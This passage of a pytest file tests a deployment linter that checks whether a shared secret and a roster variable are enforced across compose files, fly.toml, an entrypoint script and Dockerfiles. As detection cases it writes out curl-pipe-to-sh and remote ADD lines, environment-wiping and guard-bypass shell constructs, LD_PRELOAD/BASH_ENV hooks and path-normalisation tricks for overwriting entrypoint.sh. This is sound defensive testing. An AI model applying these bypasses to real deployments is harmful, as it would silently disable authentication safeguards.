                  "  delegation:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET}\n"
                  "      FIELD_DOA_ROSTER: /data/doa-roster.yaml\n")
    _, errors, _ = run(root, allow, today=TODAY)
    assert len(errors) == 1 and "is operator" in errors[0] and "expects empty-default" in errors[0]


def test_status_downgrade_is_not_hidden_by_the_old_waiver(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], expected_status="operator")
    _, errors, _ = run(root, allow, today=TODAY)
    assert len(errors) == 1 and "expects operator" in errors[0] and "empty-default" in errors[0]


@pytest.mark.parametrize("missing", ["expected_status", "services"])
def test_entry_without_the_waiver_key_does_not_load(tmp_path, missing):
    root = _only_gb10_secret_failing(tmp_path)
    kw = {"expected_status": ""} if missing == "expected_status" else {"services": ""}
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], **kw)
    with pytest.raises(SystemExit):
        lint.load_allowlist(allow)
    assert lint.main(["--root", str(root), "--allowlist", str(allow), "--today", "2026-10-23"]) == 2


def test_entry_with_a_bad_expected_status_or_service_list_does_not_load(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    for kw in ({"expected_status": "armed"}, {"expected_status": "whatever"}, {"services": []}):
        allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], **kw)
        with pytest.raises(SystemExit):
            lint.load_allowlist(allow)
    assert root.exists()


def test_committed_allowlist_waiver_keys_match_the_real_descriptors_today():
    entries = lint.load_allowlist(TOOLS / "topology_lint_allowlist.yaml")
    reports = {r.topology.id: r for r in lint.analyse(REPO)}
    for e in entries:
        res = reports[e["topology"]].vars[e["var"]]
        assert e["expected_status"] == res.status == lint.EMPTY
        assert sorted(e["services"]) == sorted(res.services)
    # the roster is decided by its one consumer, the secret by every HTTP service but the proxy
    by = {(e["topology"], e["var"]): e for e in entries}
    assert by[("gb10", "FIELD_DOA_ROSTER")]["services"] == ["delegation"]
    assert "proxy" not in by[("gb10", "FIELD_SHARED_SECRET")]["services"]


# --- second review, group 1: classification, literals, duplicate waivers --------

@pytest.mark.parametrize(
    "raw",
    [
        "${FIELD_SHARED_SECRET:-}${X:-}",          # two substitutions: greedy match used to call this armed
        "${FIELD_SHARED_SECRET:-}${X}",
        "${FIELD_SHARED_SECRET:-}x",
        "${FIELD_SHARED_SECRET:-}${FIELD_SHARED_SECRET:?x}",
        "${FIELD_SHARED_SECRET:-}}",               # stray closing brace
        "${FIELD_SHARED_SECRET:-${X:-}",           # unbalanced
        "${FIELD_SHARED_SECRET:-a}${X:-b}",
    ],
)
def test_more_than_one_substitution_or_unbalanced_braces_are_operator(raw):
    assert lint.classify_value(raw, "FIELD_SHARED_SECRET") == lint.OPERATOR
    assert lint.classify_value(raw.replace("FIELD_SHARED_SECRET", "FIELD_DOA_ROSTER"), "FIELD_DOA_ROSTER") == lint.OPERATOR


def test_quoted_nested_default_is_still_decided():
    assert lint.classify_value('${FIELD_SHARED_SECRET:-"${X:-}"}', "FIELD_SHARED_SECRET") == lint.EMPTY


def _gb10_with_secret(value_yaml):
    return GB10_ARMED.replace("${FIELD_SHARED_SECRET:?set the perimeter secret}", value_yaml, 1)


@pytest.mark.parametrize(
    "value",
    ['"${FIELD_SHARED_SECRET:-}${X:-}"', '"${FIELD_SHARED_SECRET:-}${X}"'],
)
def test_concatenated_substitutions_fail_in_compose_map_and_list_forms(tmp_path, value):
    root = make_tree(tmp_path / "map", gb10=_gb10_with_secret(value), entry=ENTRY_ARMED)
    reports, errors, _ = run(root)
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") != lint.ARMED and errors
    lst = ("services:\n  witness:\n    environment:\n      - FIELD_SHARED_SECRET=" + value.strip('"') + "\n"
           "  delegation:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?x}\n"
           "      FIELD_DOA_ROSTER: /data/doa-roster.yaml\n")
    root = make_tree(tmp_path / "list", gb10=lst, entry=ENTRY_ARMED)
    reports, errors, _ = run(root)
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") != lint.ARMED


def test_concatenated_roster_on_the_consumer_fails(tmp_path):
    gb10 = GB10_ARMED.replace("/data/doa-roster.yaml", '"${FIELD_DOA_ROSTER:-}${X:-}"')
    root = make_tree(tmp_path, gb10=gb10, entry=ENTRY_ARMED)
    reports, _, _ = run(root)
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") != lint.ARMED


def test_concatenated_substitutions_fail_in_entrypoint_and_fly_toml(tmp_path):
    entry = 'export FIELD_DOA_ROSTER="${FIELD_DOA_ROSTER:-/data/doa-roster.yaml}"\nexport FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:-}${X:-}"\n'
    reports, _, _ = run(make_tree(tmp_path / "e", gb10=GB10_ARMED, entry=entry))
    assert status(reports, "fly", "FIELD_SHARED_SECRET") != lint.ARMED
    toml = '[env]\nFIELD_SHARED_SECRET = "${FIELD_SHARED_SECRET:-}${X:-}"\n'
    reports, errors, _ = run(make_tree(tmp_path / "t", gb10=GB10_ARMED, entry=ENTRY_OPEN, toml=toml))
    assert any("literal" in e and "fly.toml" in e for e in errors)  # Fly does not interpolate: it is a literal


def test_a_dollar_value_in_fly_toml_env_is_a_committed_literal(tmp_path):
    toml = '[env]\nFIELD_SHARED_SECRET = "${FIELD_SHARED_SECRET:?must be set}"\n'
    _, errors, _ = run(make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, toml=toml))
    assert any("literal" in e and "fly.toml" in e for e in errors)


def test_non_empty_default_for_the_secret_is_a_finding_but_not_for_the_roster(tmp_path):
    gb10 = _gb10_with_secret("${FIELD_SHARED_SECRET:-abcdefgh12345678}")
    _, errors, _ = run(make_tree(tmp_path / "a", gb10=gb10, entry=ENTRY_ARMED))
    assert any("literal" in e and "abcdefgh12345678" not in e for e in errors)
    gb10 = GB10_ARMED.replace("/data/doa-roster.yaml", "${FIELD_DOA_ROSTER:-/data/doa-roster.yaml}")
    _, errors, _ = run(make_tree(tmp_path / "b", gb10=gb10, entry=ENTRY_ARMED))
    assert errors == []


@pytest.mark.parametrize(
    "export",
    ['export FIELD_SHARED_SECRET="abcdefgh12345678"', 'export FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:-abcdefgh12345678}"'],
)
def test_entrypoint_literal_or_literal_default_secret_is_a_finding(tmp_path, export):
    entry = 'export FIELD_DOA_ROSTER="${FIELD_DOA_ROSTER:-/data/doa-roster.yaml}"\n' + export + "\n"
    _, errors, _ = run(make_tree(tmp_path, gb10=GB10_ARMED, entry=entry))
    assert any("literal" in e and "entrypoint.sh" in e and "abcdefgh12345678" not in e for e in errors)


def test_duplicate_allowlist_entries_for_one_pair_do_not_load(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "a"), ("gb10", "FIELD_SHARED_SECRET", "b")])
    with pytest.raises(SystemExit):
        lint.load_allowlist(allow)
    assert lint.main(["--root", str(root), "--allowlist", str(allow), "--today", "2026-10-23"]) == 2


# --- second review, group 2: entrypoint.sh ordering, wiping exports, constructs ----

import os
import shutil
import stat
import subprocess









def _entry_findings(tmp_path, entry):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=entry)
    reports, errors, _ = run(root)
    return reports, [e for e in errors if e.startswith("FAIL fly")]
















@pytest.mark.parametrize("extra", [
    "echo hi\neval \"$X\"\n",
    "source ./other.sh\n",
    ". ./other.sh\n",
    "env -i caddy run\n",
    'echo "${!NAME}"\n',
    'export "FIELD_SHARED_""SECRET=x"\n',
    "declare -n REF=FIELD_SHARED_SECRET\n",
    "BASH_ENV=/tmp/x bash -c true\n",
])
def test_constructs_that_hide_assignments_are_findings(tmp_path, extra):
    _, fly = _entry_findings(tmp_path, ENTRY_ARMED + extra)
    assert fly, extra




# --- second review, group 3: compose command mentions, HTTP default, consumer key ---



def test_a_command_that_does_not_mention_the_variables_is_fine(tmp_path):
    extra = ("services:\n  fine:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set it}\n"
             "    command: fine serve --host 0.0.0.0 --port 9\n")
    _, errors, _ = run(_c_tree(tmp_path, extra))
    assert errors == []


def test_a_service_with_no_ports_or_serve_command_and_no_entry_is_assumed_http(tmp_path):
    extra = "services:\n  quiet:\n    image: x\n    command: [\"python\", \"app.py\"]\n"
    reports, errors, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY and errors


def test_network_mode_is_taken_from_the_last_file_that_sets_it(tmp_path):
    base = C_BASE + "  tool:\n    image: x\n    network_mode: none\n"
    # the override puts it on the network: it must now count (and has no entry)
    reports, _, _ = run(_c_tree(tmp_path / "a", "services:\n  tool:\n    network_mode: bridge\n", base=base))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY
    # and the other way round
    base = C_BASE + "  tool:\n    image: x\n"
    reports, errors, _ = run(_c_tree(tmp_path / "b", "services:\n  tool:\n    network_mode: none\n", base=base))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.ARMED and errors == []


def test_roster_consumer_is_found_by_its_command_not_its_name(tmp_path):
    base = C_BASE.replace("  delegation:", "  authority:")           # renamed, same command
    reports, errors, _ = run(_c_tree(tmp_path / "a", base=base))
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") == lint.ARMED and errors == []
    weak = base.replace("      FIELD_DOA_ROSTER: /data/doa-roster.yaml", "      FIELD_DOA_ROSTER: ${FIELD_DOA_ROSTER:-}")
    reports, _, _ = run(_c_tree(tmp_path / "b", base=weak))
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") == lint.EMPTY
    # a service merely NAMED delegation that runs something else is not the consumer
    other = C_BASE.replace("command: delegation serve", "command: something-else serve")
    reports, errors, _ = run(_c_tree(tmp_path / "c", base=other))
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") != lint.ARMED and errors


def test_roster_consumer_found_by_image_name(tmp_path):
    base = C_BASE.replace("    command: delegation serve --host 0.0.0.0 --port 8003\n", "    image: ghcr.io/x/delegation-authority:1\n").replace("  delegation:", "  authority:")
    reports, _, _ = run(_c_tree(tmp_path, base=base))
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") == lint.ARMED


# --- second review, group 4: fly.toml sections, Dockerfile allow-list, repo-wide scan --

def _fly_toml(tmp_path, toml):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, toml=toml)
    _, errors, _ = run(root)
    return [e for e in errors if e.startswith("FAIL fly")]


@pytest.mark.parametrize("toml,needle", [
    ("[env]\n[experimental]\ncmd = ['x']\n", "experimental"),
    ("[env]\n[processes]\napp = 'x'\n", "processes"),
    ("[env]\n[[services]]\ninternal_port = 1\n", "services"),
    ("[env]\n[deploy]\nrelease_command = 'x'\n", "deploy"),
    ("[env]\n[build]\nimage = 'evil:1'\n", "image"),
    ("[env]\n[build]\nbuilder = 'paketobuildpacks/builder'\n", "builder"),
])
def test_unknown_fly_toml_sections_and_non_dockerfile_builds_are_findings(tmp_path, toml, needle):
    fly = _fly_toml(tmp_path, toml)
    assert fly and any("fly.toml" in e and needle in e for e in fly), fly


def test_the_known_fly_toml_sections_are_accepted(tmp_path):
    toml = ('app = "x"\nprimary_region = "yyz"\n[build]\ndockerfile = "Dockerfile"\n[env]\nA = "1"\n'
            '[http_service]\ninternal_port = 8080\n[[http_service.checks]]\npath = "/"\n[[mounts]]\nsource = "d"\n[[vm]]\nsize = "s"\n')
    assert _fly_toml(tmp_path, toml) == []


@pytest.mark.parametrize("dockerfile", [
    DOCKERFILE_OK.replace("COPY integration/fly/entrypoint.sh /entrypoint.sh", 'COPY ["integration/fly/entrypoint.sh", "/entrypoint.sh"]'),
    DOCKERFILE_OK + "RUN sed -i 's/\\r$//' /entrypoint.sh\n",
    DOCKERFILE_OK + "COPY --from=caddy:2-alpine /usr/bin/caddy /usr/bin/caddy\n",
    DOCKERFILE_OK + "WORKDIR /platform\nRUN pip install --no-cache-dir \\n    ./a \\n    ./b\nEXPOSE 8080\nARG FIELD_BUILD_SHA=unknown\n",
])
def test_known_good_dockerfile_forms_are_not_findings(tmp_path, dockerfile):
    _, fly = _fly_findings(tmp_path, dockerfile=dockerfile)
    assert fly == [], fly


@pytest.mark.parametrize("extra,needle", [
    ("FROM python:3.12-slim\n", "FROM"),
    ("ADD https://example.com/x.tar /opt/\n", "ADD"),
    ("COPY --from=evil:1 /a /b\n", "--from"),
    ("COPY integration/fly/ /\n", "COPY"),
    ("ENV BASH_ENV=/etc/evil\n", "BASH_ENV"),
    ("RUN curl -s https://example.com/x | sh\n", "RUN"),
    ('SHELL ["/bin/sh", "-c"]\n', "SHELL"),
    ("ONBUILD RUN true\n", "ONBUILD"),
])
def test_dockerfile_allow_list_rejects_the_rest(tmp_path, extra, needle):
    _, fly = _fly_findings(tmp_path, dockerfile=DOCKERFILE_OK + extra)
    assert fly and any("Dockerfile" in e and needle in e for e in fly), fly


@pytest.mark.parametrize("rel,body", [
    ("deploy/stack.yml", "services:\n  a:\n    image: x\n"),
    (".deploy/compose.yaml", "services:\n  a:\n    image: x\n"),
    ("ops/app.toml", "[http_service]\ninternal_port = 1\n"),
    ("ops/fly.prod.toml", "[build]\ndockerfile = 'x'\n"),
    ("ops/Dockerfile.prod", "FROM x\n"),
    ("ops/start.sh", "export FIELD_SHARED_SECRET=\n"),
])
def test_unclassified_files_anywhere_in_the_repo_fail(tmp_path, rel, body):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, extra={rel: body})
    _, errors, _ = run(root)
    assert any(e.startswith("unclassified descriptor") and rel in e for e in errors), errors


@pytest.mark.parametrize("rel,body", [
    ("ops/start.sh", "echo hello\n"),                                  # a script that mentions neither variable
    ("node_modules/x/docker-compose.yml", "services:\n  a:\n    image: x\n"),
    (".git/hooks/compose.yml", "services:\n  a:\n    image: x\n"),
    (".github/workflows/ci.yml", "jobs:\n  t:\n    runs-on: x\n"),
    ("pyproject.toml", "[build-system]\nrequires = []\n"),
])
def test_unrelated_files_are_not_flagged(tmp_path, rel, body):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, extra={rel: body})
    _, errors, _ = run(root)
    assert errors == [], errors


def test_reviewed_files_that_must_stay_clean_are_checked(tmp_path):
    assert lint.reviewed_file_problems(REPO) == []
    (tmp_path / "integration/demo").mkdir(parents=True)
    (tmp_path / "integration/demo/Dockerfile").write_text("FROM x\nENV FIELD_SHARED_SECRET=abc\n", encoding="utf-8")
    assert lint.reviewed_file_problems(tmp_path) and "integration/demo/Dockerfile" in lint.reviewed_file_problems(tmp_path)[0]


def test_cli_fails_when_a_reviewed_clean_file_starts_mentioning_a_variable(tmp_path):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED,
                     extra={"integration/demo/Dockerfile": "FROM x\nENV FIELD_SHARED_SECRET=abc\n"})
    assert lint.main(["--root", str(root), "--today", "2026-10-23"]) == 1


# --- second review, group 5: bypasses found by running the reviewer's cases ----------





@pytest.mark.parametrize("key", ["BASH_ENV", "ENV", "PROMPT_COMMAND", "LD_PRELOAD", "PYTHONSTARTUP", "PYTHONPATH", "SHELLOPTS"])
def test_startup_hook_environment_keys_are_findings_in_fly_toml_and_compose(tmp_path, key):
    toml = f'[env]\n{key} = "/data/boot.sh"\n'
    fly = _fly_toml(tmp_path / "t", toml)
    assert fly and any(key in e for e in fly), fly
    gb10 = GB10_ARMED + f"  other:\n    network_mode: none\n    environment:\n      {key}: /data/boot.sh\n"
    _, errors, _ = run(make_tree(tmp_path / "c", gb10=gb10, entry=ENTRY_ARMED))
    assert any(key in e for e in errors), errors


@pytest.mark.parametrize("rel,body", [
    ("integration/fly/staging.toml", 'app = "x"\n'),
    ("integration/fly/start.sh", "#!/bin/sh\n"),
    ("integration/new/run.sh", "echo hi\n"),
    ("deploy/prod.toml", 'primary_region = "yyz"\n'),
])
def test_more_descriptor_shapes_are_unclassified(tmp_path, rel, body):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, extra={rel: body})
    _, errors, _ = run(root)
    assert any(e.startswith("unclassified descriptor") and rel in e for e in errors), errors


# --- third review: behavioural gate for entrypoint.sh, coarse tripwire, other families ---

IN_CI = bool(os.environ.get("CI"))  # read at import: the autouse fixture below hides CI from the code under test


@pytest.fixture(autouse=True)
def _static_by_default(monkeypatch):
    """Fixture trees use the fast static path; behavioural tests opt in. Per test, never process-wide."""
    monkeypatch.setenv("TOPOLOGY_LINT_BEHAVIOURAL", "0")
    monkeypatch.delenv("CI", raising=False)
    lint._RUN_CACHE.clear()

SV, DV = "FIELD_SHARED_SECRET", "FIELD_DOA_ROSTER"
REAL_ENTRY = (REPO / "integration/fly/entrypoint.sh").read_bytes().decode("utf-8").replace("\r\n", "\n")
GUARD_S = ': "${FIELD_SHARED_SECRET:?set}"\n'
GUARD_D = (': "${FIELD_DOA_ROSTER:?set}"\n'
           '[ -n "${FIELD_DOA_ROSTER// /}" ] || { echo "FIELD_DOA_ROSTER is blank" >&2; exit 1; }\n')
EXPORT_S = 'export FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:-}"\n'
EXPORT_D = 'export FIELD_DOA_ROSTER="${FIELD_DOA_ROSTER:-}"\n'
FIRST_LAUNCH = "registry serve --host 127.0.0.1 --port 8001 &\n"


@pytest.fixture
def bash():
    found = lint.find_bash()
    if found is None:
        if IN_CI:
            pytest.fail("bash is required to run the entrypoint behavioural check in CI")
        pytest.skip("no bash found (set TOPOLOGY_LINT_BASH); the behavioural entrypoint check needs one")
    return found


def _arm(text, guard_s=GUARD_S, guard_d=GUARD_D, after_s="", after_d=""):
    assert EXPORT_S in text and EXPORT_D in text
    return text.replace(EXPORT_D, guard_d + EXPORT_D + after_d, 1).replace(EXPORT_S, guard_s + EXPORT_S + after_s, 1)


def test_the_real_entrypoint_is_exercised_and_reports_its_actual_state(bash):
    r = lint.run_entrypoint(REAL_ENTRY)
    assert r.ran and r.findings == [], (r.reason, r.findings)
    assert r.status == {SV: lint.EMPTY, DV: lint.EMPTY}  # the shipped script does not refuse to start (allowlisted)
    assert r.stubs == list(lint.EXPECTED_FLY_STUBS)


def test_the_real_entrypoint_with_guards_refuses_before_any_service_and_starts_them_when_set(bash):
    r = lint.run_entrypoint(_arm(REAL_ENTRY))
    assert r.ran and r.findings == [], (r.reason, r.findings)
    assert r.status == {SV: lint.ARMED, DV: lint.ARMED}


def _red(r):
    return bool(r.findings) or r.status[SV] != lint.ARMED or r.status[DV] != lint.ARMED


@pytest.mark.parametrize("name,text", [
    ("wipe after the guard", _arm(REAL_ENTRY, after_s="export FIELD_SHARED_SECRET=\n")),
    ("wipe with ${V:0:0}", _arm(REAL_ENTRY, after_s='export FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:0:0}"\n')),
    ("guard in a quoted heredoc", _arm(REAL_ENTRY, guard_s="cat > /dev/null <<'EOF'\n" + GUARD_S + "EOF\n")),
    ("true || before the guard", _arm(REAL_ENTRY, guard_s="true || " + GUARD_S)),
    ("guard in if false", _arm(REAL_ENTRY, guard_s="if false; then\n  " + GUARD_S + "fi\n")),
    ("printf -v wipe", _arm(REAL_ENTRY, after_s="printf -v FIELD_SHARED_SECRET ''\n")),
    ("env -i on the first service", _arm(REAL_ENTRY).replace(FIRST_LAUNCH, "env -i " + FIRST_LAUNCH, 1)),
    ("guard after the services start", REAL_ENTRY.replace("wait -n || true", GUARD_S + GUARD_D + "wait -n || true", 1)),
    ("the secret guard is missing", _arm(REAL_ENTRY, guard_s="")),
])
def test_each_entrypoint_bypass_makes_the_behavioural_check_red(bash, name, text):
    assert _red(lint.run_entrypoint(text)), name


def test_the_behavioural_result_decides_fly_status_in_analyse(bash, tmp_path):
    root = make_tree(tmp_path / "armed", gb10=GB10_ARMED, entry=_arm(REAL_ENTRY))
    reports = lint.analyse(root, behavioural=True)
    fly = next(r for r in reports if r.topology.id == "fly")
    assert fly.vars[SV].status == lint.ARMED and fly.vars[DV].status == lint.ARMED and fly.findings == []
    assert fly.behaviour.startswith("RAN")
    root = make_tree(tmp_path / "open", gb10=GB10_ARMED, entry=REAL_ENTRY)
    fly = next(r for r in lint.analyse(root, behavioural=True) if r.topology.id == "fly")
    assert fly.vars[SV].status == lint.EMPTY


def test_cli_prints_that_the_behavioural_check_ran(bash, capsys, monkeypatch):
    monkeypatch.setenv("TOPOLOGY_LINT_BEHAVIOURAL", "1")
    assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 0
    assert "entrypoint behavioural check: RAN" in capsys.readouterr().out


def test_cli_fails_instead_of_skipping_in_ci_when_bash_is_missing(capsys, monkeypatch):
    monkeypatch.setenv("TOPOLOGY_LINT_BEHAVIOURAL", "1")
    monkeypatch.setattr(lint, "find_bash", lambda: None)
    monkeypatch.setenv("CI", "true")
    assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 1
    out = capsys.readouterr().out
    assert "entrypoint behavioural check: SKIPPED" in out and "CI" in out
    monkeypatch.delenv("CI")
    assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 0
    assert "entrypoint behavioural check: SKIPPED" in capsys.readouterr().out


@pytest.mark.parametrize("extra", [
    "/usr/bin/env -i caddy run\n",
    "command env FIELD_X= caddy run\n",
    "\\env caddy run\n",
    "sh -c 'unset FIELD_SHARED_SECRET; caddy run'\n",
    "bash -c true\n",
    "exec -c caddy run\n",
    "printf -v FIELD_SHARED_SECRET ''\n",
    "read FIELD_SHARED_SECRET < /dev/null\n",
    "ev\\\nal true\n",                        # the shell joins continuation lines WITHOUT a space
    "X=1 # note \\\nenv -i y\n",              # a trailing comment ending in a backslash is not a continuation
    "cat <<EOF\nx\nEOF\n",
    "export LD_PRELOAD=/x.so\n",
])
def test_coarse_tripwire_rules(tmp_path, extra):
    _, fly = _entry_findings(tmp_path, ENTRY_ARMED + extra)
    assert fly, extra


@pytest.mark.parametrize("extra", [
    '{ : "${FIELD_DOA_ROSTER:?set}"; }\n',
    '( : "${FIELD_DOA_ROSTER:?set}" )\n',
    ': "${FIELD_DOA_ROSTER:?set ${HOME}}"\n',
])
def test_forms_the_old_parser_rejected_are_not_tripwires(tmp_path, extra):
    _, fly = _entry_findings(tmp_path, ENTRY_ARMED + extra)
    assert fly == [], fly


# Dockerfile: continuation joins, `# escape=`, destination normalisation
@pytest.mark.parametrize("dockerfile", [
    DOCKERFILE_OK + "ENV FIELD_SHARED_\\\nSECRET=abcdefgh1234\n",
    "# escape=`\n" + DOCKERFILE_OK + "ENV FIELD_SHARED_`\nSECRET=abcdefgh1234\n",
    DOCKERFILE_OK + "ENV A=1 \\\n    FIELD_SHARED_SECRET=abcdefgh1234\n",
])
def test_dockerfile_continuations_are_joined_the_way_docker_does(tmp_path, dockerfile):
    _, fly = _fly_findings(tmp_path, dockerfile=dockerfile)
    assert any("ENV" in e for e in fly), fly


@pytest.mark.parametrize("copy", [
    "COPY evil /./entrypoint.sh",
    "COPY evil //entrypoint.sh",
    "COPY evil /usr/../entrypoint.sh",
    "WORKDIR /\nCOPY evil entrypoint.sh",
    "WORKDIR /app\nCOPY evil ../entrypoint.sh",
    "ENV D=/\nCOPY evil ${D}entrypoint.sh",
    'COPY ["evil", "/./entrypoint.sh"]',
])
def test_copy_destinations_are_normalised_before_comparing_with_entrypoint_sh(tmp_path, copy):
    _, fly = _fly_findings(tmp_path, dockerfile=DOCKERFILE_OK + copy + "\n")
    assert any("COPY" in e and "entrypoint.sh" in e for e in fly), fly


def test_the_legit_copy_in_other_spellings_is_still_fine(tmp_path):
    df = DOCKERFILE_OK.replace("COPY integration/fly/entrypoint.sh /entrypoint.sh", "WORKDIR /\nCOPY integration/fly/entrypoint.sh /./entrypoint.sh")
    _, fly = _fly_findings(tmp_path, dockerfile=df)
    assert fly == [], fly


# nested defaults, risky keys outside compose
@pytest.mark.parametrize("raw,expected", [
    ("${FIELD_SHARED_SECRET:-${W:-changeme}}", lint.PLACEHOLDER),
    ("${FIELD_SHARED_SECRET:-${W:-}}", lint.EMPTY),
])
def test_nested_defaults_get_the_outer_variables_placeholder_test(raw, expected):
    assert lint.classify_value(raw, "FIELD_SHARED_SECRET") == expected


def test_nested_literal_defaults_are_committed_secrets_everywhere(tmp_path):
    nested = "${FIELD_SHARED_SECRET:-${W:-hunter2hunter2}}"
    assert lint.is_committed_literal(nested, SV)
    gb10 = GB10_ARMED.replace("${FIELD_SHARED_SECRET:?set the perimeter secret}", nested, 1)
    _, errors, _ = run(make_tree(tmp_path / "c", gb10=gb10, entry=ENTRY_ARMED))
    assert any("literal" in e and "hunter2hunter2" not in e for e in errors)
    entry = ENTRY_ARMED.replace(': "${FIELD_SHARED_SECRET:?FIELD_SHARED_SECRET must be set}"\n', "") + f'export FIELD_SHARED_SECRET="{nested}"\n'
    _, errors, _ = run(make_tree(tmp_path / "e", gb10=GB10_ARMED, entry=entry))
    assert any("literal" in e and "entrypoint.sh" in e for e in errors)
    _, fly = _fly_findings(tmp_path / "d", dockerfile=DOCKERFILE_OK + f"ENV FIELD_SHARED_SECRET={nested}\n")
    assert any("ENV" in e for e in fly)


def test_risky_env_keys_in_dockerfile_env_are_findings(tmp_path):
    _, fly = _fly_findings(tmp_path, dockerfile=DOCKERFILE_OK + "ENV LD_PRELOAD=/x.so\n")
    assert any("LD_PRELOAD" in e for e in fly), fly


# exemptions must also match what the service is
def test_proxy_exemption_needs_a_caddy_image(tmp_path):
    base = C_BASE.replace("image: caddy:2-alpine", "image: something-else:1")
    reports, errors, _ = run(_c_tree(tmp_path, base=base))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY and errors


def test_admin_tool_exemption_needs_network_mode_none(tmp_path):
    extra = "services:\n  keys-admin:\n    image: x\n    ports: ['1:1']\n"
    reports, _, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY


# command-level wrappers
@pytest.mark.parametrize("body", [
    "    command: env -i x serve --port 9\n",
    "    command: [\"sudo\", \"x\", \"serve\"]\n",
    "    entrypoint: su app -c x\n",
    "    command: setpriv --reuid 1 x serve\n",
    "    command: sh -c 'exec env -i x'\n",
])
def test_command_wrappers_that_can_clear_the_environment_are_findings(tmp_path, body):
    extra = "services:\n  w:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set it}\n" + body
    _, errors, _ = run(_c_tree(tmp_path, extra))
    assert any(e.startswith("FAIL gb10 (deployed)") and ("env" in e or "wrap" in e) for e in errors), errors


def test_command_and_entrypoint_mentions_stay_findings_but_a_healthcheck_is_not(tmp_path):
    base = "services:\n  sneaky:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set it}\n"
    for i, body in enumerate(("    command: sh -c 'unset FIELD_SHARED_SECRET; exec x serve'\n",
                              "    entrypoint: [\"sh\", \"-c\", \"unset FIELD_SHARED_SECRET; exec x\"]\n")):
        _, errors, _ = run(_c_tree(tmp_path / f"m{i}", base + body))
        assert any("mentions FIELD_SHARED_SECRET" in e for e in errors), body
    hc = base + "    healthcheck:\n      test: [\"CMD-SHELL\", \"echo $$FIELD_SHARED_SECRET\"]\n"
    _, errors, _ = run(_c_tree(tmp_path / "hc", hc))
    assert errors == [], errors


@pytest.mark.parametrize("body", ["    scale: 0\n", "    deploy:\n      replicas: 0\n"])
def test_a_service_scaled_to_zero_never_runs_so_it_is_not_weak(tmp_path, body):
    extra = "services:\n  idle:\n    image: x\n" + body
    reports, errors, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.ARMED and errors == []


def test_a_service_scaled_up_again_by_a_later_file_counts(tmp_path):
    base = C_BASE + "  idle:\n    image: x\n    scale: 0\n"
    reports, _, _ = run(_c_tree(tmp_path, "services:\n  idle:\n    scale: 1\n", base=base))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY


# repo-wide discovery shapes
@pytest.mark.parametrize("rel,body", [
    ("d/a.yml", "services: {a: {image: x}}\n"),
    ("d/b.yml", '"services":\n  a:\n    image: x\n'),
    ("d/c.yml", "services :\n  a:\n    image: x\n"),
    ("d/d.yml", "x-anchor: &a {image: x}\nservices:\n  a: *a\n"),
    ("d/e.json", '{"services": {"a": {"image": "x"}}}\n'),
    ("d/Containerfile", "FROM x\n"),
    ("d/Containerfile.prod", "FROM x\n"),
    ("d/stack.yml.j2", "services:\n  a:\n    image: x\n"),
    ("d/deploy.toml", "[env]\nA = '1'\n"),
    ("d/start.sh.j2", "export FIELD_SHARED_SECRET=\n"),
])
def test_more_discovery_shapes_are_unclassified(tmp_path, rel, body):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, extra={rel: body})
    _, errors, _ = run(root)
    assert any(e.startswith("unclassified descriptor") and rel in e for e in errors), errors


@pytest.mark.parametrize("rel,body", [
    ("package.json", '{"name": "x", "scripts": {}}\n'),
    ("data/services.json", '{"hello": 1}\n'),
])
def test_unrelated_json_is_not_flagged(tmp_path, rel, body):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, extra={rel: body})
    _, errors, _ = run(root)
    assert errors == [], errors


# --- fourth review: contain the run, compare values, no silent disable, kill the mutants ---

def _top(text, txt):
    assert "set -eu\n" in text
    return text.replace("set -eu\n", "set -eu\n" + txt, 1)


def _fly_report(tmp_path, entry):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=entry)
